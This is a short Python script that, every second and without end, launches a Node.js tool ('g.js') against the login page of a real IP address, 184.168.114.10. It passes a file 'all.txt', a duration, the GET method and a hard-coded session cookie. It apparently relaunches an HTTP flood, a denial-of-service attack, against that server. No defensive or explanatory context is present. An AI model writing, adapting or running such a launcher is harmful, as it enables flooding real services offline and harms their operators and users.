import schedule
import time
import os
import sys

os.system('node g.js https://184.168.114.10/LOGIN all.txt 360 GET PHPSESSID:s08rg740aq8vv2mo406ejp4pa5')

def job():
    os.system('node g.js https://184.168.114.10/LOGIN all.txt 360 GET PHPSESSID:s08rg740aq8vv2mo406ejp4pa5')
    
schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)
